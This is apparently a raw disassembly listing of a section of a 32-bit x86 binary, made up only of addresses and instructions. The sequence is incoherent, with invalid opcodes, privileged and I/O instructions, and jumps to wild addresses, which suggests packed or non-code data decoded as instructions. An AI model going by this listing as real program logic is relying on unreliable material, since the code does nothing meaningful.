  4235ec:	cmp    al,dh
  4235ee:	int    0x5c
  4235f0:	sub    ch,BYTE PTR [edx+0x3f]
  4235f3:	(bad)  
  4235f4:	(bad)  
  4235f5:	iret   
  4235f6:	pop    edx
  4235f7:	lods   eax,DWORD PTR ds:[esi]
  4235f8:	fsubr  st(5),st
  4235fa:	adc    DWORD PTR [edx-0x42],eax
  4235fd:	adc    eax,0x9476e080
  423602:	aad    0x90
  423604:	jne    0x423596
  423606:	mov    ah,0xbc
  423608:	enter  0x118e,0x32
  42360c:	sub    eax,0x23ef3eca
  423611:	xor    BYTE PTR [esi-0x198e2a60],bl
  423617:	jo     0x4235bb
  423619:	inc    ebx
  42361a:	in     eax,dx
  42361b:	dec    ebp
  42361c:	inc    ebp
  42361d:	ins    DWORD PTR es:[edi],dx
  42361e:	aas    
  42361f:	sbb    eax,0xfb6d87b4
  423624:	ret    
  423625:	popa   
  423626:	sar    BYTE PTR [edx-0x26],1
  423629:	mov    bh,0x5
  42362b:	push   ecx
  42362c:	jo     0x4235d9
  42362e:	jle    0x42367f
  423630:	push   edi
  423631:	bound  ecx,QWORD PTR [ebx]
  423633:	mov    edx,0x45670bde
  423638:	sbb    eax,0xca39374e
  42363d:	jge    0x4235fe
  42363f:	scas   al,BYTE PTR es:[edi]
  423640:	aam    0x1d
  423642:	ins    DWORD PTR es:[edi],dx
  423643:	pop    esi
  423644:	mov    ebx,0x12e3805a
  423649:	inc    esp
  42364a:	cmp    al,0xf7
  42364c:	outs   dx,WORD PTR ds:[esi]
  42364e:	sahf   
  42364f:	aaa    
  423650:	test   eax,0xec587f31
  423655:	ja     0x423660
  423657:	cmp    edi,ebx
  423659:	and    ebp,DWORD PTR [edi+esi*8+0x255001c8]
  423660:	in     al,0xc6
  423662:	mov    DWORD PTR [edi+0x39],esi
  423665:	sub    DWORD PTR [edx],edi
  423667:	push   0x1a
  423669:	iret   
  42366a:	dec    ebp
  42366b:	push   ecx
  42366c:	lahf   
  42366d:	dec    esp
  42366e:	adc    cl,BYTE PTR [ecx+0x1281d477]
  423674:	mov    esp,0xb1a5bf0b
  423679:	pop    ss
  42367a:	in     eax,0xa8
  42367c:	test   al,0x2
  42367e:	ret    0xdb0e
  423681:	mov    esp,0x429eeb44
  423686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423687:	and    eax,edx
  423689:	sub    ebx,DWORD PTR [ebx-0x1]
  42368c:	xor    edi,DWORD PTR [edx]
  42368e:	mov    bl,0xeb
  423690:	jbe    0x4236c2
  423692:	mov    ebp,0x14b9343f
  423697:	pop    edi
  423698:	leave  
  423699:	into   
  42369a:	pop    ds
  42369b:	pop    esp
  42369c:	jge    0x4236d1
  42369e:	dec    ebx
  42369f:	add    ebp,DWORD PTR [ebx+0x63]
  4236a2:	pop    edi
  4236a3:	icebp  
  4236a4:	hlt    
  4236a5:	popf   
  4236a6:	retf   
  4236a7:	dec    ebx
  4236a8:	and    BYTE PTR [eax],dl
  4236aa:	loopne 0x4236b6
  4236ac:	xor    DWORD PTR ds:0x17e177ac,edx
  4236b2:	mov    edx,0x70c2361e
  4236b7:	add    eax,edx
  4236b9:	adc    eax,0xb7d88bf1
  4236be:	jbe    0x42367a
  4236c0:	mov    cl,0xe9
  4236c2:	pushf  
  4236c3:	dec    esp
  4236c4:	and    ecx,DWORD PTR [edx]
  4236c6:	adc    BYTE PTR [ecx-0x27351b1f],0x55
  4236cd:	mov    WORD PTR [eax],es
	...
  4236d7:	add    BYTE PTR [eax],al
  4236d9:	add    dl,dl
  4236db:	and    dl,BYTE PTR [esi-0x21410966]
  4236e1:	push   0x61
  4236e3:	push   cs
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	sbb    eax,0xac44afd5
  4236eb:	mov    al,0x1
  4236ed:	add    ah,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    BYTE PTR [ebp+0x4a],bl
  4236f4:	jne    0x423751
  4236f6:	(bad)  
  4236f7:	in     al,dx
  4236f8:	xchg   ebx,eax
  4236f9:	sub    BYTE PTR [esi-0x266c271f],bl
  4236ff:	mov    eax,ds:0xa4d03dcc
  423704:	push   es
  423705:	jge    0x42371d
  423707:	lods   eax,DWORD PTR ds:[esi]
  423708:	and    al,0x66
  42370a:	stc    
  42370b:	mov    ecx,0xd39abf59
  423710:	mov    cr1,esi
  423713:	fwait
  423714:	mov    ch,0x32
  423716:	(bad)  [ebp-0x44d9901c]
  42371c:	sbb    eax,0xcce6e11f
  423721:	loope  0x42372a
  423723:	inc    bx
  423725:	push   cs
  423726:	out    0x83,al
  423728:	mov    ah,0x45
  42372a:	adc    BYTE PTR [esi-0x6dc24910],al
  423730:	(bad)  
  423731:	div    ebp
  423733:	push   edi
  423734:	lods   al,BYTE PTR ds:[esi]
  423735:	(bad)  
  423736:	rol    DWORD PTR [esi+0x21],cl
  423739:	or     ah,0x8f
  42373c:	bound  ebp,QWORD PTR [edi+ebx*8+0x79f883cc]
  423743:	add    eax,0x7c389b63
  423748:	cmp    ebx,DWORD PTR [edx+0x2d]
  42374b:	or     BYTE PTR [ebx+ebx*2-0x68fe790c],0x7c
  423753:	test   al,0xa
  423755:	jp     0x4237c1
  423757:	mov    WORD PTR [esp+eax*1-0x5c],ss
  42375b:	lock sbb esp,DWORD PTR [ebx+ebx*2-0x4e]
  423760:	mov    edi,0x254f4327
  423765:	in     al,0x0
  423767:	mov    dh,0x91
  423769:	pop    esi
  42376a:	inc    ebp
  42376b:	jl     0x4237a5
  42376d:	push   DWORD PTR [ecx+0x5d]
  423770:	adc    bl,BYTE PTR [eax-0x74]
  423773:	scas   eax,DWORD PTR es:[edi]
  423774:	add    DWORD PTR [edi+0x732ca296],0x65
  42377b:	loopne 0x4237de
  42377d:	std    
  42377e:	xchg   edi,eax
  42377f:	lea    ebp,[edi]
  423781:	push   eax
  423782:	sbb    al,0xbf
  423784:	mov    ds:0xf7909935,eax
  423789:	xchg   DWORD PTR [edx],esp
  42378b:	(bad)  
  42378c:	imul   edx,DWORD PTR [esi+0xd630e46],0xd16ee04f
  423796:	add    esp,DWORD PTR [edx]
  423798:	lahf   
  423799:	xchg   edi,eax
  42379a:	push   esi
  42379b:	xchg   BYTE PTR [edx+0x33],al
  42379e:	sub    DWORD PTR cs:[ebx-0x1b4a4005],ebp
  4237a5:	fcmovb st,st(4)
  4237a7:	mov    eax,ds:0xbb020f5b
  4237ac:	sub    eax,0xdbcf5b4b
  4237b2:	mov    fs,WORD PTR gs:[edi]
  4237b5:	mov    ebp,0xb40746d9
  4237ba:	and    esp,ebx
  4237bc:	inc    esp
  4237bd:	in     al,0xed
  4237bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237c0:	mov    edi,0x16ff1c77
  4237c5:	sbb    eax,0x4956fa06
  4237ca:	stos   DWORD PTR es:[edi],eax
  4237cb:	dec    ebx
  4237cc:	add    eax,0x3fc41581
  4237d1:	push   edx
  4237d2:	(bad)  
  4237d3:	(bad)
  4237d7:	pop    edi
  4237d8:	sub    BYTE PTR [ebp-0xc],dl
  4237db:	inc    ebp
  4237dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237dd:	mov    WORD PTR ds:0xf4ec39f2,fs
  4237e3:	out    dx,al
  4237e4:	imul   eax,DWORD PTR [esi-0x75],0xa199d604
  4237eb:	fwait
  4237ec:	adc    al,0x98
  4237ee:	mov    edx,0xda121594
  4237f3:	mov    al,ds:0xd577a529
  4237f8:	loope  0x42377b
  4237fa:	push   ds
  4237fb:	mov    al,ds:0xdb2d7c8c
  423800:	jle    0x4237f4
  423802:	fidiv  WORD PTR [ebp-0x61]
  423805:	jl     0x4237fb
  423807:	xchg   edx,eax
  423808:	rcr    ebx,cl
  42380a:	pop    edx
  42380b:	xlat   BYTE PTR ds:[ebx]
  42380c:	ret    0x3905
  42380f:	dec    eax
  423810:	cmp    al,0xa
  423812:	and    BYTE PTR [edi+0x34],dh
  423815:	stc    
  423816:	test   al,0x96
  423818:	lahf   
  423819:	repnz cmp eax,0x2f10dc25
  42381f:	(bad)  
  423821:	scas   al,BYTE PTR es:[edi]
  423822:	loope  0x423893
  423824:	je     0x4237c2
  423826:	inc    ebx
  423827:	adc    ch,dl
  423829:	popa   
  42382a:	ror    BYTE PTR [ebp+0x54],0xfe
  42382e:	scas   eax,DWORD PTR es:[edi]
  42382f:	adc    bl,BYTE PTR [ebx-0x1a73cd25]
  423835:	sbb    ch,BYTE PTR [ebp-0x6d2ff35f]
  42383b:	bnd je 0x423857
  42383e:	mov    bh,0xfe
  423840:	test   ecx,eax
  423842:	test   ah,ch
  423844:	add    bh,BYTE PTR [esi-0x260037b6]
  42384a:	mov    ds:0xa76a49bf,eax
  42384f:	cmp    ah,BYTE PTR [ebx]
  423851:	out    0x4b,al
  423853:	push   ebp
  423854:	es xchg ebx,eax
  423856:	pop    ebx
  423857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423858:	cli    
  423859:	in     al,0x2a
  42385b:	push   ds
  42385c:	les    ecx,FWORD PTR [edx]
  42385e:	js     0x4238a1
  423860:	push   ss
  423861:	dec    ebx
  423862:	inc    ebp
  423863:	mov    ebp,DWORD PTR [edi+0x7a]
  423866:	lods   eax,DWORD PTR ds:[esi]
  423867:	fistp  QWORD PTR ds:0x698ee831
  42386d:	push   es
  42386e:	out    0x24,al
  423870:	xchg   edi,eax
  423871:	call   0xa2f71233
  423876:	shl    BYTE PTR [edx-0x28],cl
  423879:	add    BYTE PTR [edx+0x700b578b],ah
  42387f:	stc    
  423880:	or     al,0xc6
  423882:	aaa    
  423883:	fs push eax
  423885:	push   ecx
  423886:	mov    al,ds:0xa38f5d48
  42388b:	ficomp DWORD PTR [edx-0x45]
  42388e:	fcom   DWORD PTR [ebx-0x7196959]
  423894:	xor    bh,dl
  423896:	mov    ebx,0xe01f48fb
  42389b:	iret   
  42389c:	cdq    
  42389d:	mov    bh,0xfa
  42389f:	clc    
  4238a0:	in     al,dx
  4238a1:	cmp    ebp,ebp
  4238a3:	fild   QWORD PTR [ecx+0x7b]
  4238a6:	(bad)  
  4238a8:	lods   eax,DWORD PTR ds:[esi]
  4238a9:	int    0x48
  4238ab:	gs mov dl,0xd
  4238ae:	mov    bl,BYTE PTR [ebx+0x2a5e1670]
  4238b4:	in     eax,dx
  4238b5:	fist   DWORD PTR [ebp-0x6a]
  4238b8:	icebp  
  4238b9:	pop    eax
  4238ba:	pop    esp
  4238bb:	adc    eax,esi
  4238bd:	sub    BYTE PTR [esi+0x16],ch
  4238c0:	sub    al,0x63
  4238c2:	repz mov esi,0x77844f81
  4238c8:	pop    eax
  4238c9:	icebp  
  4238ca:	ins    DWORD PTR es:[edi],dx
  4238cb:	test   ebp,0x19bdbc27
  4238d1:	xchg   esp,eax
  4238d2:	or     DWORD PTR [edx*8-0x687ada02],ebx
  4238d9:	push   ecx
  4238da:	adc    ch,BYTE PTR [eax+eiz*2]
  4238dd:	repz sub bh,bh
  4238e0:	push   0xd6e55acb
  4238e5:	and    eax,0x41f6ab63
  4238ea:	xchg   BYTE PTR [ebx+0x22ca],dl
	...
  4238f8:	add    BYTE PTR [eax],al
  4238fa:	fnstsw WORD PTR [edi+ecx*4]
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	xchg   BYTE PTR [edx-0x18],cl
  423909:	dec    ecx
  42390a:	test   al,0xb2
  42390c:	add    DWORD PTR [eax],eax
  42390e:	cld    
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    al,bl
  423913:	sub    BYTE PTR [eax-0x3a71ab31],dh
  423919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42391a:	test   al,0x32
  42391c:	retf   
  42391d:	pop    esp
  42391e:	push   edi
  42391f:	f2xm1  
  423921:	cmc    
  423922:	push   ss
  423923:	mov    DWORD PTR [eax+eiz*8+0x57],edx
  423927:	ffree  st(6)
  423929:	xchg   edi,eax
  42392a:	(bad)  
  42392b:	shr    DWORD PTR [ecx],cl
  42392d:	pop    ss
  42392e:	mov    ds:0x5ba52377,al
  423933:	nop
  423934:	mov    edx,DWORD PTR [edx+0x29fde07a]
  42393a:	push   ebx
  42393b:	nop
  42393c:	icebp  
  42393d:	rcr    BYTE PTR [ebx-0x1b],cl
  423940:	iret   
  423941:	sbb    eax,0xdf8190de
  423946:	sub    dl,BYTE PTR [eax-0x536a2f21]
  42394c:	std    
  42394d:	mov    ebx,ebp
  42394f:	inc    eax
  423950:	(bad)  
  423951:	cdq    
  423952:	lds    ebx,FWORD PTR [edi+eax*8+0x41]
  423956:	dec    eax
  423957:	mov    dh,0xb0
  423959:	sub    ebp,DWORD PTR [ecx-0x14]
  42395c:	xor    edi,DWORD PTR [ebx-0x5cf608b7]
  423962:	inc    eax
  423963:	scas   eax,DWORD PTR es:[edi]
  423964:	das    
  423965:	jp     0x4239db
  423967:	pop    ss
  423968:	inc    ebx
  423969:	pop    ds
  42396a:	adc    al,0xd6
  42396c:	mov    dl,bh
  42396e:	retf   0x14de
  423971:	outs   dx,BYTE PTR ds:[esi]
  423972:	dec    ecx
  423973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423974:	mov    ebp,0xdc7b15b4
  423979:	ins    BYTE PTR es:[edi],dx
  42397a:	sbb    al,0xd4
  42397c:	rcr    BYTE PTR [edx-0x424e7512],cl
  423982:	adc    ch,BYTE PTR [eiz*2+0x3178677f]
  423989:	aad    0xb4
  42398b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42398c:	sub    DWORD PTR [ebx+0x2e],esi
  42398f:	iret   
  423990:	fs pop esp
  423992:	hlt    
  423993:	push   ds
  423994:	fsub   DWORD PTR [esi-0x68]
  423997:	int    0xff
  423999:	cmc    
  42399a:	sahf   
  42399b:	pop    ds
  42399c:	aad    0xfb
  42399e:	ds in  al,0x68
  4239a1:	push   ebp
  4239a2:	inc    ebp
  4239a3:	sub    DWORD PTR [ebp-0x6f],0x28
  4239a7:	scas   al,BYTE PTR es:[edi]
  4239a8:	xchg   ebp,eax
  4239a9:	or     eax,0x37c0756e
  4239ae:	inc    esi
  4239af:	out    0xc9,eax
  4239b1:	cmp    DWORD PTR [eax],ecx
  4239b3:	xchg   edi,eax
  4239b4:	fsub   QWORD PTR [ebx+0x71]
  4239b7:	cmp    al,0xc9
  4239b9:	push   0xa75e5c07
  4239be:	fcmovnb st,st(2)
  4239c0:	(bad)  
  4239c1:	jne    0x4239af
  4239c3:	jo     0x42394f
  4239c5:	xchg   esp,eax
  4239c6:	punpckhbw mm1,mm7
  4239c9:	or     al,0x8
  4239cb:	add    DWORD PTR [ebp+0x5786788],0xffffffd4
  4239d2:	test   BYTE PTR [esi],dl
  4239d4:	jmp    0x4239ca
  4239d6:	out    dx,eax
  4239d7:	mov    ebp,0xf4f5d84c
  4239dc:	fnsave [ebx+0x77eb7a48]
  4239e2:	mov    ds:0x9001d773,al
  4239e7:	xchg   DWORD PTR [edx],esi
  4239e9:	(bad)  
  4239ea:	daa    
  4239eb:	xor    DWORD PTR [edx+esi*2],ecx
  4239ee:	xor    edi,esi
  4239f0:	push   edi
  4239f1:	mov    esp,0xb679606d
  4239f6:	and    eax,0xb608b900
  4239fb:	fwait
  4239fc:	dec    ebp
  4239fd:	and    bl,dh
  4239ff:	sub    eax,0x99a2cc83
  423a04:	xor    esi,ebx
  423a06:	ins    BYTE PTR es:[edi],dx
  423a07:	scas   al,BYTE PTR es:[edi]
  423a08:	lahf   
  423a09:	mov    WORD PTR [eax+edx*1-0x6],fs
  423a0d:	and    bh,BYTE PTR [ecx-0x556181e2]
  423a13:	push   ebx
  423a14:	pop    eax
  423a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a16:	cmovo  ebx,ebx
  423a19:	push   edi
  423a1a:	add    ch,bl
  423a1c:	stos   BYTE PTR es:[edi],al
  423a1d:	fdivr  DWORD PTR [edx-0x76ba63a7]
  423a23:	adc    al,0xd0
  423a25:	lds    esp,FWORD PTR [edx]
  423a27:	dec    ebp
  423a28:	xor    DWORD PTR [esp+ebp*1-0x4b],ebx
  423a2c:	push   cs
  423a2d:	std    
  423a2e:	ja     0x423a87
  423a30:	jnp    0x4239d6
  423a32:	dec    ecx
  423a33:	cwde   
  423a34:	jmp    0x3d811fbb
  423a39:	cs xchg ebp,eax
  423a3b:	mov    edi,DWORD PTR [ebx]
  423a3d:	retf   0xad30
  423a40:	sub    al,0xcc
  423a42:	lds    ebx,FWORD PTR [esi]
  423a44:	sbb    DWORD PTR [edx],edi
  423a46:	inc    ebx
  423a47:	scas   al,BYTE PTR es:[edi]
  423a48:	jmp    DWORD PTR [ecx]
  423a4a:	ins    DWORD PTR es:[edi],dx
  423a4b:	sub    bh,BYTE PTR [edx-0x6630c7a4]
  423a51:	in     eax,0x51
  423a53:	sub    al,0x8a
  423a55:	frstor [ecx+0x64]
  423a58:	sbb    BYTE PTR [edx-0x79],ch
  423a5b:	push   cs
  423a5c:	inc    edx
  423a5d:	mov    edx,0xe7b4e259
  423a62:	jmp    0x1736:0x2530be9e
  423a69:	cmp    eax,0xaffea6c3
  423a6e:	adc    ah,BYTE PTR ds:0xf0122ec2
  423a74:	mov    bh,0x32
  423a76:	mov    al,BYTE PTR cs:[esi+0x2b9727ed]
  423a7d:	xchg   DWORD PTR [esi+edx*1],edi
  423a80:	je     0x423ae8
  423a82:	lea    ebx,[edi+0x670032e0]
  423a88:	out    dx,al
  423a89:	push   ds
  423a8a:	test   al,0xa0
  423a8c:	js     0x423afe
  423a8e:	and    cl,BYTE PTR ds:0x28ad107e
  423a94:	(bad)  
  423a95:	and    DWORD PTR [esi],eax
  423a97:	cli    
  423a98:	sbb    ecx,DWORD PTR [eax-0x75]
  423a9b:	mov    ebp,0x8207da9f
  423aa0:	js     0x423add
  423aa2:	aaa    
  423aa3:	sbb    esi,DWORD PTR [ecx-0x62837898]
  423aa9:	dec    ebx
  423aaa:	or     dl,BYTE PTR [eax+0x4ed0d642]
  423ab0:	jae    0x423aa2
  423ab2:	gs repnz in eax,0x96
  423ab6:	stos   DWORD PTR es:[edi],eax
  423ab7:	xchg   esp,eax
  423ab8:	mov    ch,0xf3
  423aba:	loopne 0x423a64
  423abc:	pusha  
  423abd:	ficom  DWORD PTR [ecx+0x329ed007]
  423ac3:	int3   
  423ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ac5:	pextrw eax,mm2,0xdd
  423ac9:	ins    BYTE PTR es:[edi],dx
  423aca:	cs push edx
  423acc:	jbe    0x423b01
  423ace:	pop    ds
  423acf:	call   0x4faf:0x50f38fe6
  423ad6:	in     eax,0x79
  423ad8:	push   ds
  423ad9:	jecxz  0x423afd
  423adb:	iret   
  423adc:	pop    edx
  423add:	mov    ecx,0xd1be342b
  423ae2:	mov    ebx,0xde07e28
  423ae7:	pop    ebp
  423ae8:	pop    ds
  423ae9:	das    
  423aea:	cmc    
  423aeb:	inc    eax
  423aec:	pop    ebp
  423aed:	lds    ebx,FWORD PTR [ecx-0x4ffedcef]
  423af3:	sar    DWORD PTR [ebx-0x3a],0x2e
  423af7:	into   
  423af8:	xor    BYTE PTR [ebx-0x5187230f],cl
  423afe:	das    
  423aff:	add    al,0x70
  423b01:	out    0xaa,eax
  423b03:	push   ss
  423b04:	outs   dx,DWORD PTR ds:[esi]
  423b05:	xor    BYTE PTR [ecx-0x11],ch
  423b08:	xor    eax,0xffe1980f
  423b0d:	and    BYTE PTR [eax],al
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423ab5
  423b27:	adc    al,0x22
  423b29:	mov    eax,0x1b4a4
  423b2e:	cld    
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [eax+0x1e],cl
  423b34:	xchg   DWORD PTR [ecx],edi
  423b36:	or     eax,edx
  423b38:	inc    edx
  423b39:	retf   0x84d6
  423b3c:	clc    
  423b3d:	pop    ecx
  423b3e:	shl    BYTE PTR [edi+0x3a],0x42
  423b42:	pop    es
  423b43:	test   ebp,edx
  423b45:	xor    edi,DWORD PTR [edi]
  423b47:	jle    0x423b1c
  423b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b4a:	ins    BYTE PTR es:[edi],dx
  423b4b:	inc    edi
  423b4c:	bound  edi,QWORD PTR [ebx]
  423b4e:	xchg   BYTE PTR [edx],ch
  423b50:	pop    esi
  423b51:	pop    ecx
  423b52:	int    0x36
  423b54:	mov    dl,0x6a
  423b56:	retf   
  423b57:	dec    esi
  423b58:	or     eax,0xd5ee91b2
  423b5d:	ret    0xea6
  423b60:	pop    ebx
  423b61:	in     al,0x2e
  423b63:	jb     0x423b54
  423b65:	mov    esp,0xe0434d41
  423b6a:	in     eax,0x4e
  423b6c:	and    al,BYTE PTR [edx-0x5c]
  423b6f:	xor    dl,BYTE PTR [eax-0x7d37f9e8]
  423b75:	(bad)
  423b7a:	adc    BYTE PTR [edx],dh
  423b7c:	xchg   edi,eax
  423b7d:	jmp    0xc8f2dcd5
  423b82:	cmp    bl,BYTE PTR [eax+0x67]
  423b85:	in     eax,0x65
  423b87:	(bad)  
  423b89:	add    eax,0x37e8d851
  423b8e:	cmc    
  423b8f:	clc    
  423b90:	jmp    0x423bab
  423b92:	and    edi,edx
  423b94:	pop    ecx
  423b95:	cld    
  423b96:	add    eax,0x75fb41b3
  423b9b:	aad    0x51
  423b9d:	popf   
  423b9e:	cmp    cl,BYTE PTR [eax]
  423ba0:	jp     0x423b6d
  423ba2:	out    0x4,eax
  423ba4:	xchg   ebp,eax
  423ba5:	call   0x330e29d2
  423baa:	retf   0x862f
  423bad:	daa    
  423bae:	jl     0x423b60
  423bb0:	aas    
  423bb1:	add    eax,0x53248b98
  423bb6:	outs   dx,BYTE PTR ds:[esi]
  423bb7:	jmp    0x423c37
  423bb9:	dec    esi
  423bba:	mov    eax,0xb38be9b0
  423bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bc0:	and    ah,BYTE PTR [edx+0x7c]
  423bc3:	mov    esp,ss
  423bc5:	push   0x9b6b78d0
  423bca:	imul   ebp,DWORD PTR [edx],0x92ecf8eb
  423bd0:	sub    DWORD PTR [edx+0x17],esi
  423bd3:	mov    cl,0x78
  423bd5:	inc    edi
  423bd6:	sbb    BYTE PTR [ebx-0x3400fad5],dl
  423bdc:	aas    
  423bdd:	fs push ebp
  423bdf:	es push 0xc00a32cc
  423be5:	sbb    ebx,DWORD PTR [esi+0xa]
  423be8:	mov    ds:0x934edb68,al
  423bed:	lds    ecx,FWORD PTR [ecx-0x5d23efc6]
  423bf3:	data16 int3 
  423bf5:	sti    
  423bf6:	in     eax,dx
  423bf7:	jno    0x423c65
  423bf9:	pusha  
  423bfa:	(bad)  
  423bfb:	cld    
  423bfc:	push   0xffffffb9
  423bfe:	arpl   WORD PTR [eax-0x4347f158],bx
  423c04:	xchg   edx,eax
  423c05:	fwait
  423c06:	mov    ch,BYTE PTR [edx-0x5328263]
  423c0c:	add    ebx,DWORD PTR [edx-0x64562c23]
  423c12:	dec    ecx
  423c13:	mov    al,ds:0xcc73b69f
  423c18:	xor    dl,BYTE PTR [edi+0x22e8e5c6]
  423c1e:	mov    bl,0xcc
  423c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c21:	pop    edx
  423c22:	xchg   esp,eax
  423c23:	int    0x29
  423c25:	adc    DWORD PTR ds:[esi],edx
  423c28:	shl    DWORD PTR [esi],1
  423c2a:	test   DWORD PTR [eax+eiz*8],eax
  423c2d:	mov    eax,DWORD PTR [esi-0x164785e3]
  423c33:	test   al,0x8c
  423c35:	xor    al,0x3
  423c37:	pop    ebx
  423c38:	test   ecx,ebx
  423c3a:	int    0xa1
  423c3c:	repnz retf 
  423c3e:	sahf   
  423c3f:	xchg   ebp,eax
  423c40:	mov    fs,WORD PTR ds:0x2ddc662f
  423c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c47:	cs (bad) 
  423c4a:	aam    0x13
  423c4c:	out    0xb3,eax
  423c4e:	test   esi,esp
  423c50:	xchg   BYTE PTR [edx+0x229af5ff],al
  423c56:	xor    cl,BYTE PTR [ebx]
  423c58:	xchg   edx,eax
  423c59:	cmp    DWORD PTR [edx+0x2a56653b],edx
  423c5f:	sbb    eax,0x52e64eeb
  423c64:	int    0xaa
  423c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c67:	call   0x1ccb6132
  423c6c:	push   ecx
  423c6d:	fsub   DWORD PTR [esi]
  423c6f:	in     al,dx
  423c70:	ins    DWORD PTR es:[edi],dx
  423c71:	add    DWORD PTR [edx-0x46561edd],0x99a757d1
  423c7b:	daa    
  423c7c:	xor    edx,esp
  423c7e:	fptan  
  423c80:	and    eax,0xe77c33b4
  423c85:	mov    dh,0x50
  423c87:	add    BYTE PTR ds:0x1be8b40a,ah
  423c8d:	dec    esi
  423c8e:	push   es
  423c8f:	mov    esi,0xc8cc982a
  423c94:	sub    eax,0x37970875
  423c99:	inc    esi
  423c9a:	mov    ecx,0x8a4e352a
  423c9f:	ss arpl dx,di
  423ca2:	add    al,0x9e
  423ca4:	rcr    DWORD PTR [eax],cl
  423ca6:	inc    esp
  423ca7:	pushf  
  423ca8:	lods   al,BYTE PTR ds:[esi]
  423ca9:	cmc    
  423caa:	jecxz  0x423cf0
  423cac:	call   0x685f2d26
  423cb1:	and    BYTE PTR [edx-0x4beb008b],dl
  423cb7:	ins    BYTE PTR es:[edi],dx
  423cb8:	aas    
  423cb9:	daa    
  423cba:	mov    bh,0x87
  423cbc:	jle    0x423cc2
  423cbe:	cs popa 
  423cc0:	fnstenv [edi+0xedc9393]
  423cc6:	push   ebp
  423cc7:	(bad)  
  423cc8:	sar    BYTE PTR [ebx-0x39],cl
  423ccb:	and    BYTE PTR [ebx-0x10],bl
  423cce:	sub    BYTE PTR [ebp+0x4d9e578],bh
  423cd4:	out    dx,al
  423cd5:	inc    esi
  423cd6:	pushf  
  423cd7:	popf   
  423cd8:	push   ss
  423cd9:	js     0x423ce3
  423cdb:	and    eax,DWORD PTR [eax+eax*2+0x3ddc979]
  423ce2:	ja     0x423d44
  423ce4:	dec    ebp
  423ce5:	fidiv  DWORD PTR [ebx-0x5710b998]
  423ceb:	xor    bh,BYTE PTR [edi]
  423ced:	cmp    eax,0x40580fc4
  423cf2:	xchg   DWORD PTR [edx-0x2ce1fe5f],ebp
  423cf8:	sub    DWORD PTR [edx],esi
  423cfa:	xor    DWORD PTR [esi+0x1895b26b],edx
  423d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d01:	mov    al,0x48
  423d03:	sbb    DWORD PTR [esi-0x68],esp
  423d06:	pop    es
  423d07:	hlt    
  423d08:	bound  ecx,QWORD PTR ss:[esi-0x4005766d]
  423d0f:	cmc    
  423d10:	std    
  423d11:	push   ebx
  423d12:	retf   0x900e
  423d15:	fld    DWORD PTR [ebx-0x3701a928]
  423d1b:	add    al,0x4b
  423d1d:	fidiv  WORD PTR [esi]
  423d1f:	jo     0x423d68
  423d21:	js     0x423d2e
  423d23:	or     edi,DWORD PTR [edi]
  423d25:	sahf   
  423d26:	pop    eax
  423d27:	enter  0x6f0d,0x3
  423d2b:	adc    esi,edi
  423d2d:	xchg   BYTE PTR [eax],al
	...
  423d37:	add    BYTE PTR [eax],al
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0xe457ffb2
  423d47:	into   
  423d48:	pop    esp
  423d49:	test   eax,0x1b6a0
  423d4e:	cld    
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [edx],bl
  423d53:	lds    eax,FWORD PTR [edi]
  423d55:	out    dx,eax
  423d56:	inc    ebx
  423d57:	push   eax
  423d58:	inc    esi
  423d59:	adc    bh,BYTE PTR [esi+0x555f129b]
  423d5f:	cmp    DWORD PTR [ecx-0x4a3f9002],0xbe89f8af
  423d69:	sti    
  423d6a:	xor    eax,0x89c0c83a
  423d6f:	dec    ecx
  423d70:	add    DWORD PTR [eax-0x3a485a0d],0x5d91a983
  423d7a:	lock add al,0x76
  423d7d:	iret   
  423d7e:	mov    bh,0x2b
  423d80:	inc    edx
  423d81:	fs into 
  423d83:	push   cs
  423d84:	int    0xfc
  423d86:	and    bl,cl
  423d88:	std    
  423d89:	lds    edx,FWORD PTR [esi+0x79]
  423d8c:	(bad)  
  423d8d:	aad    0x8b
  423d8f:	and    bl,BYTE PTR [ecx+esi*8+0x214bbde5]
  423d96:	ins    DWORD PTR es:[edi],dx
  423d97:	and    eax,0x12cecb91
  423d9c:	push   esi
  423d9d:	mov    ds:0x959d076a,al
  423da2:	mov    ebp,0x656aa4e0
  423da7:	adc    al,BYTE PTR [edx-0x38]
  423daa:	cmp    al,BYTE PTR [bp+si-0x410f]
  423daf:	jl     0x423d56
  423db1:	je     0x423d75
  423db3:	mov    dl,0xc
  423db5:	add    DWORD PTR [eax-0x62],ebp
  423db8:	nop    DWORD PTR [esi+eiz*1]
  423dbc:	cmp    eax,0xf58868d8
  423dc1:	addr16 xchg edi,eax
  423dc3:	or     al,dl
  423dc5:	sub    al,ah
  423dc7:	push   ebp
  423dc8:	scas   eax,DWORD PTR es:[edi]
  423dc9:	aam    0xd4
  423dcb:	mov    ch,0x57
  423dcd:	mov    edx,DWORD PTR [edx+0x5b717580]
  423dd3:	scas   al,BYTE PTR es:[edi]
